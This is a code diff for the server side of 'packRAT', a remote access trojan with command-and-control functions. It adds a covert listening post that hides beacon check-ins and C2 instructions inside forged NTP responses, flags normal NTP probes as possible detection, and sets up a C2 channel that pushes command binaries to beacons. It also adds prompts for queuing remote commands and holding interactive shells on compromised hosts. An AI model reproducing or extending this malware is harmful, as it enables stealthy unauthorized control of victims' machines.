@@ -8,6 +8,11 @@
 #include <arpa/inet.h>
 #include <sys/socket.h>
 #include <dirent.h> 
+#include <sys/types.h>
+#include <netinet/in.h>
+#include <time.h>
+#include <signal.h>
+
 
 
 
@@ -74,9 +79,9 @@ Capabilities required:
 //Reset
 #define CRESET "\e[0m"
 
-#define NTP_RESPONSE (char[]) {0x24, 0x01, 0x03, 0xed, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0d, 0x53, 0x48, 0x4d, 0x00, 0xe7, 0x67, 0x93, 0x35, 0x1f, 0x92, 0xd1, 0xda, 0xbf, 0xb5, 0xd2, 0x4c, 0x5c, 0xc0, 0x1c, 0xb0, 0xe7, 0x67, 0x93, 0x3b, 0xb3, 0x39, 0x71, 0x8d, 0xe7, 0x67, 0x93, 0x3b, 0xb3, 0x3c, 0x06, 0xb5}
-
-#define NULL_MSG (char[]) {0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}
+// NTP Server things
+#define DEFAULT_NTP_PACKET (char[]) {0x24, 0x04, 0x08, 0xe7, 0x00, 0x00, 0x01, 0x17, 0x00, 0x00, 0x00, 0x56, 0xe1, 0xfe, 0x1e, 0xbe, 0xe7, 0x70, 0x15, 0x39, 0xc0, 0x84, 0x50, 0xd8, 0xe7, 0x70, 0x16, 0x41, 0x78, 0xd2, 0x91, 0x32, 0xe7, 0x70, 0x16, 0x41, 0x93, 0x4e, 0xc6, 0x9c, 0xe7, 0x70, 0x16, 0x41, 0x93, 0x51, 0xe5, 0x72}
+#define NTP_TIMESTAMP_DELTA 2208988800ull
 
 
 char listen_ip[16];
@@ -90,19 +95,19 @@ int listening;
 
 
 typedef struct session {
-    unsigned int id;
     char* ip;
     int port;
-    char* recv_buf;
-    char* send_buf;
-    int sock;
+    char* cmd;
+    int conn;
+    struct sockaddr_in addr;
 } Session;
 
 typedef struct beacon {
     unsigned int id;
     char* type;
     Session* sessions;
-    int session_count;
+    int active_sessions;
+    char pending_sessions;
     char* ip;
     int port;
     long last_seen;
@@ -115,14 +120,15 @@ int beacon_count = 0;
 
 // Set up initial UDP listener on port 123 bound to any interface
 int lp_sock;
-struct sockaddr_in lp_addr, lp_req_addr;
+struct sockaddr_in lp_addr;
+struct sockaddr  lp_req_addr;
 socklen_t lp_req_addr_len = sizeof(lp_req_addr);
 char recv_msg[60];
 char data[1024];
 
 // Set up TCP listener on port 80 bound to any interface
 int stage_sock;
-struct sockaddr_in stage_addr, stage_req_addr;
+struct sockaddr_in stage_addr, stage_req_addr; 
 socklen_t stage_req_addr_len = sizeof(stage_req_addr);
 char stage_req[1024];
 
@@ -138,6 +144,9 @@ void print(char* msg) {
 }
 void error(char* msg) {
     printf(RED "  [ERROR]: %s\n" CRESET, msg);
+}
+void warning(char* msg) {
+    printf(YEL "  [WARNING]: %s\n" CRESET, msg);
 }
 void info (char* msg) {
     printf(BLU "  [INFO]: %s\n" CRESET, msg);
@@ -322,7 +331,7 @@ int help() {
     printf("    ls - List all active beacons\n");
     printf("    use <id> - enter session mode for beacon (to execute commands on it)\n");
     printf("    burn <id> - Burn a beacon (self-destruct and clean up)\n");
-    printf("    listen - Select IP to listen on and start listening\n");
+    printf("    l[isten] - Select IP to listen on and start listening\n");
     printf("    exit - Exit the console\n");
     printf("\n" CRESET);
     return 0;
@@ -330,19 +339,19 @@ int help() {
 int status() {
     printf("  [STATUS]\n");
     if (stage_sock) {
-        printf(GRN "    Stager: listening on %s:%d\n" CRESET, listen_ip, stager_port);
+        printf(GRN "    Stager: Listening on %s:%d\n" CRESET, listen_ip, stager_port);
     } else {
         printf(YEL "    Stager: Not running\n" CRESET);
     }
     if (lp_sock) {
-        printf(GRN "    LP: listening on %s:%d\n" CRESET, listen_ip, lp_port);
+        printf(GRN "    LP:     Listening on %s:%d\n" CRESET, listen_ip, lp_port);
     } else {
-        printf(YEL "    LP: Not running\n" CRESET);
+        printf(YEL "    LP:     Not running\n" CRESET);
     }
     if (c2_sock) {
-        printf(GRN "    C2: listening on %s:%d\n" CRESET, listen_ip, c2_port);
+        printf(GRN "    C2:     Listening on %s:%d\n" CRESET, listen_ip, c2_port);
     } else {
-        printf(YEL "    C2: Not running\n" CRESET);
+        printf(YEL "    C2:     Not running\n" CRESET);
     }
     return 0;
 }
@@ -524,22 +533,23 @@ void *stager_loop(void *vargp) {
     return NULL;
 }
 
-
 int init_lp() {
+    srand(time(NULL));
+
     // Create UDP socket:
-    lp_sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
+    lp_sock = socket(AF_INET, SOCK_DGRAM, 0);
     if(lp_sock < 0){
         error("Problem while creating lp socket\n");
         return -1;
     }
 
-    int lp_port = 123;
     int bind_succes = 0;
 
     // Set port and IP:
+    bzero(&lp_addr, sizeof(lp_addr));
     lp_addr.sin_family = AF_INET;
     lp_addr.sin_port = htons(123);
-    lp_addr.sin_addr.s_addr = INADDR_ANY;
+    lp_addr.sin_addr.s_addr = htonl(INADDR_ANY);
 
     // Bind to the set port and IP:
     while(bind(lp_sock, (struct sockaddr*)&lp_addr, sizeof(lp_addr)) < 0){
@@ -557,24 +567,199 @@ int init_lp() {
 }
 void *lp_loop(void *vargp) {
     while (running) {
-        int i = 0;
-        int recv_len = 0;
-        do {
-            i += recv_len;
-            // Receive NTP message:
-            recv_len = recvfrom(lp_sock, recv_msg, 60, 0, (struct sockaddr*)&lp_req_addr, &lp_req_addr_len);
-            if(recv_len < 0){
-                error("Problem while receiving message\n");
-                continue;
+        time_t t;
+        int id = 0;
+        char buffer[1024];
+        unsigned int delta;
+        int n = recvfrom(lp_sock, buffer, 1024, 0, &lp_req_addr, &lp_req_addr_len);
+        if (n == 48) {
+
+            if ((unsigned char) buffer[0] == 0xe3) {
+                id =  ntohl(*(unsigned int *)&buffer[40]) ^ (*(unsigned int *)&buffer[44]);
+                //printf("Received ping from %d\n", id);
+            } else {
+                id = -1;
+                warning("Possible probing, received standard NTP request");
             }
-            memcpy(data + i, recv_msg + 52, recv_len - 52);
-        } while(memcmp(data + i, NULL_MSG, 8) != 0);
-        printf("\n%s\n", data);
-        fflush(stdout);
+
+            // Prep response
+            memcpy(buffer, DEFAULT_NTP_PACKET, 16);
+            memcpy(buffer + 24, buffer + 40, 8);
+
+            t = time(NULL);
+            delta = htonl(t + NTP_TIMESTAMP_DELTA);
+            memcpy(&buffer[40], &delta, 4);
+            memcpy(&buffer[32], &delta, 4);
+            delta = rand();
+            memcpy(&buffer[44], &delta, 4);
+            delta = htonl(delta + (rand() % 100));
+            memcpy(&buffer[36], &delta, 4);
+            delta = htonl((t + NTP_TIMESTAMP_DELTA) - 4096 - (rand() % 100));
+            memcpy(&buffer[16], &delta, 4);
+            delta = rand();
+            memcpy(&buffer[20], &delta, 4);
+
+            if (id > -1 && id < beacon_count) {
+                int port = htonl(c2_port);
+                int c2_inet = inet_addr(listen_ip);
+                unsigned char sleep_level = 3;
+
+                
+                memcpy(&buffer[4], &port, 4);
+                memcpy(&buffer[12], &c2_inet, 4);
+
+                buffer[2] = sleep_level;
+                buffer[47] = buffer[46] ^ buffer[45] ^ buffer[44] ^ beacons[id].pending_sessions;
+
+                beacons[id].last_seen = time(NULL);
+            }
+
+            // Send NTP packet
+            sendto(lp_sock, buffer, 48, 0, (struct sockaddr *)&lp_req_addr, sizeof(lp_req_addr));
+        }
     }
     info("  LP thread exiting\n");
     return NULL;
 }
+
+int init_c2() {
+    // Create TCP socket
+    c2_sock = socket(AF_INET, SOCK_STREAM, 0);
+    if(c2_sock < 0){
+        printf("Problem while creating staging socket\n");
+        return -1;
+    }
+
+    int bind_succes = 0;
+
+    // Set port and IP:
+    c2_addr.sin_family = AF_INET;
+    c2_addr.sin_port = htons(c2_port);
+    c2_addr.sin_addr.s_addr = INADDR_ANY;
+
+    // Bind to the set port and IP:
+    while(bind(c2_sock, (const struct sockaddr*)&c2_addr, c2_req_addr_len) < 0){
+        printf(RED "  [ERROR]:   C2 listener couldn't bind to port %d, trying port %d\n" CRESET, c2_port, c2_port + 1);
+        fflush(stdout);
+        c2_port++;
+        if (c2_port == 453) {
+            c2_port = 4343;
+        }
+        if (c2_port == 4353) {
+            printf("C2 port bind failed\n");
+            return -1;
+        }
+        stage_addr.sin_port = htons(c2_port);
+    }
+    printf(GRN "  [SUCCESS]: Stager bound to port %d\n" CRESET, c2_port);
+    fflush(stdout);
+    return 0;
+}
+void *c2_loop(void *vargp) {
+    int id = 0;
+    while (running) {
+        if(listen(c2_sock, 1) < 0){
+            perror("Problem while listening");
+            continue;
+        }
+        // Accept incoming connection:
+        int conn = accept(c2_sock, (struct sockaddr*)&c2_req_addr, &c2_req_addr_len);
+        if(conn < 0){
+            perror("Problem while accepting connection");
+            continue;
+        }
+        // Receive header packet
+        int recv_len = recvfrom(conn, &id, 4, 0, (struct sockaddr*)&c2_req_addr, &c2_req_addr_len);
+        if(recv_len < 0){
+            perror("Problem while receiving message");
+            continue;
+        }
+
+        // Verify ID within bounds
+        if (id < 0 || id >= beacon_count) {
+            printf("  [WARNING]: Invalid ID received from C2\n");
+            continue;
+        }
+
+        // Connect connection to next pending session on that beacon
+        beacons[id].sessions[beacons[id].active_sessions].conn = conn;
+        beacons[id].sessions[beacons[id].active_sessions].ip = inet_ntoa(c2_req_addr.sin_addr);
+        beacons[id].sessions[beacons[id].active_sessions].port = ntohs(c2_req_addr.sin_port);
+        beacons[id].sessions[beacons[id].active_sessions].addr = c2_req_addr;
+
+        char* line = malloc(strlen(beacons[id].sessions[beacons[id].active_sessions].cmd) + 1);
+        strcpy(line, beacons[id].sessions[beacons[id].active_sessions].cmd);
+
+        beacons[id].active_sessions++;
+        beacons[id].pending_sessions--;
+
+        // Run the command staged for the session
+        char* args = malloc(strlen(line) + 1);
+        strcpy(args, line);
+        char* file = strtok(line, " ");
+        int args_len = strlen(args) + 1;
+
+        FILE *pp;
+        char path[1024];
+        char which[1024];
+
+        /* Open the command for reading. */
+        sprintf(which, "/bin/which %s", file);
+        pp = popen(which, "r");
+        if (pp == NULL) {
+            printf("Failed to find command %s\n", file);
+            continue;
+        }
+
+        if (fgets(path, sizeof(path), pp) == NULL) {
+            printf("Failed to find command %s\n", file);
+            continue;
+        }
+
+        pclose(pp);
+        path[strlen(path) - 1] = '\0';
+        FILE *fp = fopen(path, "r");
+        if (fp == NULL) {
+            printf("Error opening file %s\n", path);
+            continue;
+        }
+
+        fseek(fp, 0, SEEK_END);
+        int data_len = ftell(fp);
+        fseek(fp, 0, SEEK_SET);
+
+        // Send header packet
+        int lengths[2] = {args_len, data_len};
+        sendto(conn, lengths, 8, 0, (struct sockaddr*)&c2_req_addr, c2_req_addr_len);
+
+        // Send the arguments packet
+        sendto(conn, args, args_len, 0, (struct sockaddr*)&c2_req_addr, c2_req_addr_len);
+
+        char* data_buf = malloc(data_len);
+
+        fread(data_buf, 1, data_len, fp);
+        fclose(fp);
+
+        // Send the data packet
+        int sent = 0;
+        while (data_len > 1024) {
+            sent = sendto(conn, data_buf, 1024, 0, (struct sockaddr*)&c2_req_addr, c2_req_addr_len);
+            if (sent < 0) {
+                perror("Error sending data");
+                break;
+            }
+            data_len -= sent;
+            data_buf += sent;
+        }
+        sent = sendto(conn, data_buf, data_len, 0, (struct sockaddr*)&c2_req_addr, c2_req_addr_len);
+        if (sent < 0) {
+            perror("Error sending data");
+        }
+    }
+    info("  C2 thread exiting\n");
+    return NULL;
+}
+
 
 int start_listeners() {
     strcpy(listen_ip, select_ip());
@@ -591,6 +776,12 @@ int start_listeners() {
         return -1;
     }
 
+    // Initialize the c2
+    if (init_c2() < 0) {
+        error("C2 initialization failed");
+        return -1;
+    }
+
     // Launch the stager
     pthread_t stager_thread;
     pthread_create(&stager_thread, NULL, stager_loop, NULL);
@@ -598,6 +789,10 @@ int start_listeners() {
     // Launch the lp
     pthread_t lp_thread;
     pthread_create(&lp_thread, NULL, lp_loop, NULL);
+
+    // Launch the c2
+    pthread_t c2_thread;
+    pthread_create(&c2_thread, NULL, c2_loop, NULL);
 
     listening = 1;
 
@@ -621,7 +816,8 @@ int generate_beacon() {
     beacons[beacon_count].ip = malloc(16);
     beacons[beacon_count].ip[0] = 0;
     beacons[beacon_count].sessions = NULL;
-    beacons[beacon_count].session_count = 0;
+    beacons[beacon_count].active_sessions = 0;
+    beacons[beacon_count].pending_sessions = 0;
 
     printf(BLU "  [INFO]: Beacon generated for %s with ID %d\n" CRESET, beacons[beacon_count].type, beacons[beacon_count].id);
     printf(BLU "          Copy the following command into the remote system to install the beacon:\n\n" CRESET);
@@ -635,28 +831,174 @@ int list_beacons() {
         printf("  No beacons - use the b[eacon] command to generate beacons\n\n");
         return 0;
     }
+    int active_count = 0;
+    int inactive_count = 0;
     for (int i = 0; i < beacon_count; i++) {
-        if (!i) {
-            printf("  Active beacons:\n");
+        if (beacons[i].last_seen > 0) {
+            active_count++;
+        } else {
+            inactive_count++;
         }
+    }
+    if (active_count) {
+        printf(BGRN "  Active beacons:\n" GRN);
+    } else {
+        printf(GRN "  No active beacons\n");
+    }
+    for (int i = 0; i < beacon_count; i++) {
         if (beacons[i].last_seen > 0) {
             printf("    %d: %s:%d (%s) - seen %lus ago \n", i, beacons[i].ip, beacons[i].port, beacons[i].type, time(NULL) - beacons[i].last_seen);
         }
-        printf("  %d: %s\n", i, beacons[i].ip);
+    }
+     if (inactive_count) {
+        printf(BYEL "  Inactive beacons:\n" YEL);
+    } else {
+        printf(YEL "  No inactive beacons\n");
     }
     for (int i = 0; i < beacon_count; i++) {
-        if (!i) {
-            printf("  Inactive beacons:\n");
-        }
         if (beacons[i].last_seen == 0) {
             printf("    %d: %s:%d (%s)\n", i, beacons[i].ip, beacons[i].port, beacons[i].type);
         }
     }
-    printf("\n");
+    printf(CRESET "\n");
     return 0;
 }
 
 
+int session_prompt(int beacon_id, int session_id) {
+    if (beacon_id < 0 || beacon_id >= beacon_count) {
+        printf(RED "  [ERROR]: Invalid beacon ID %d\n" CRESET, beacon_id);
+        return -1;
+    }
+    if (session_id < 0 || session_id >= beacons[beacon_id].active_sessions) {
+        printf(RED "  [ERROR]: Invalid session ID %d\n" CRESET, session_id);
+        return -1;
+    }
+    int conn = beacons[beacon_id].sessions[session_id].conn;
+
+    char buffer[1024];
+    int connected = 1;
+    struct sockaddr_in cliaddr = beacons[beacon_id].sessions[session_id].addr;
+    socklen_t cliaddr_len = sizeof(cliaddr);
+    pid_t pid = fork();
+    if (!pid) {
+        while (connected) {
+            // Receive data
+            int recv_len = recvfrom(conn, buffer, 1024, 0, (struct sockaddr*)&cliaddr, &cliaddr_len);
+            if(recv_len < 0){
+                error("Problem while receiving message");
+                connected = 0;
+                continue;
+            }
+            if (recv_len == 0) {
+                connected = 0;
+                break;
+            }
+            buffer[recv_len] = '\0';
+            printf("%s", buffer);
+            fflush(stdout);
+        }
+    } else {
+        while (connected) {
+            // Send data
+            char* line = NULL;
+            size_t len = 0;
+            getline(&line, &len, stdin);
+            if (strcmp(line, "exit\n") == 0) {
+                kill(pid, SIGKILL);
+                return 0;
+            }
+            int sent = sendto(conn, line, strlen(line), 0, (struct sockaddr*)&cliaddr, cliaddr_len);
+            if (sent < 0) {
+                connected = 0;
+                error("Error sending data");
+            }
+        }
+    }
+}
+int beacon_prompt(int id) {
+    if (id < 0 || id >= beacon_count) {
+        printf(RED "    [ERROR]: Invalid beacon ID\n" CRESET);
+        return -1;
+    }
+
+    printf(BBLU "    Beacon %d (%s:%d) - %s\n" CRESET, id, beacons[id].ip, beacons[id].port, beacons[id].type);
+    printf(BBLU "    Type 'help' for a list of commands\n" CRESET);
+
+    while (1) {
+        printf(BBLU "  (beacon %d)>> " CRESET, id);
+
+        char input[256];
+        fgets(input, 256, stdin);
+
+        if (strcmp(input, "help\n") == 0) {
+            printf(CYN "    help - print this help message\n");
+            printf("    clear - clear the screen\n");
+            printf("    status - print the beacon's status\n");
+            printf("    ls - list the beacon's sessions\n");
+            printf("    run <command> - run a command on the beacon\n");
+            printf("    use <session id> - enter a session\n");
+            printf("    exit - exit the beacon prompt\n" CRESET);
+        } else if (strcmp(input, "clear\n") == 0) {
+            clear();
+        } else if (strcmp(input, "status\n") == 0) {
+            printf(GRN "    ID: %d (%s:%d)\n", id, beacons[id].ip, beacons[id].port);
+            printf("    Type: %s\n", beacons[id].type);
+            printf("    Last seen: %lus ago\n", time(NULL) - beacons[id].last_seen);
+            printf("    Active sessions: %d\n", beacons[id].active_sessions);
+            printf("    Pending sessions: %d\n" CRESET, beacons[id].pending_sessions);
+        } else if (strcmp(input, "ls\n") == 0) {
+            if (beacons[id].active_sessions == 0 && beacons[id].pending_sessions == 0) {
+                printf(BCYN "    No sessions - to start new session use the 'run <command>' command\n" CRESET);
+            } else {
+                if (beacons[id].active_sessions > 0) {
+                    printf(BGRN "    Active sessions:\n" GRN);
+                } else {
+                    printf(GRN "    No active sessions\n" GRN);
+                }
+                for (int i = 0; i < beacons[id].active_sessions; i++) {
+                    printf("      %d: %s\n", i, beacons[id].sessions[i].cmd);
+                }
+                if (beacons[id].pending_sessions > 0) {
+                    printf(BYEL "    Pending sessions:\n" YEL);
+                } else {
+                    printf(YEL "    No pending sessions\n" YEL);
+                }
+                for (int i = 0; i < beacons[id].pending_sessions; i++) {
+                    printf("      %d: %s\n", i, beacons[id].sessions[i + beacons[id].active_sessions].cmd);
+                }
+                printf("\n" CRESET);
+            }
+        } else if (strncmp(input, "run ", 4) == 0) {
+            if (strlen(input) < 5) {
+                printf(RED "    [USAGE]: run <command>\n" CRESET);
+                continue;
+            }
+            char *cmd = input + 4;
+            cmd[strlen(cmd) - 1] = 0;
+            printf("    [INFO]: Running command '%s'\n", cmd);
+            beacons[id].sessions = realloc(beacons[id].sessions, (beacons[id].active_sessions + beacons[id].pending_sessions + 1) * sizeof(struct session));
+            beacons[id].sessions[beacons[id].active_sessions + beacons[id].pending_sessions].cmd = malloc(strlen(cmd) + 1);
+            strcpy(beacons[id].sessions[beacons[id].active_sessions + beacons[id].pending_sessions].cmd, cmd);
+            beacons[id].pending_sessions++;
+        } else if (strncmp(input, "use ", 4) == 0) {
+            int session_id = atoi(input + 4);
+            if (session_id < 0 || session_id >= beacons[id].active_sessions + beacons[id].pending_sessions) {
+                printf(RED "    [ERROR]: Invalid session ID\n" CRESET);
+            } else {
+                if (session_id > beacons[id].active_sessions) {
+                    printf("    [ERROR]: Session is not yet active, please wait for beacon to begin sessions\n");
+                } else {
+                    session_prompt(id, session_id);
+                }
+            }
+        } else if (strcmp(input, "exit\n") == 0) {
+            return 0;
+        } else {
+            printf(RED "    [ERROR]: Invalid command\n" CRESET);
+        }
+    }
+}
 int prompt() {
     // Print the prompt
     printf(BRED "(packRAT)>> " CRESET);
@@ -674,12 +1016,19 @@ int prompt() {
         clear();
     } else if (strcmp(input, "status\n") == 0) {
         status();
-    } else if (strcmp(input, "listen\n") == 0) {
+    } else if (strcmp(input, "l\n") == 0 || strcmp(input, "listen\n") == 0) {
         start_listeners();
     } else if (strcmp(input, "b\n") == 0 || strcmp(input, "beacon\n") == 0) {
         generate_beacon();
     } else if (strcmp(input, "ls\n") == 0) {
         list_beacons();
+    } else if (strncmp(input, "use ", 4) == 0) {
+        int id = atoi(input + 4);
+        if (id < 0 || id >= beacon_count) {
+            printf(RED "  [ERROR]: Invalid beacon ID: %d\n" CRESET, id);
+        } else {
+            beacon_prompt(id);
+        }
     } else if (strcmp(input, "exit\n") == 0) {
         printf("Goodbye!\n\n");
         return 1;
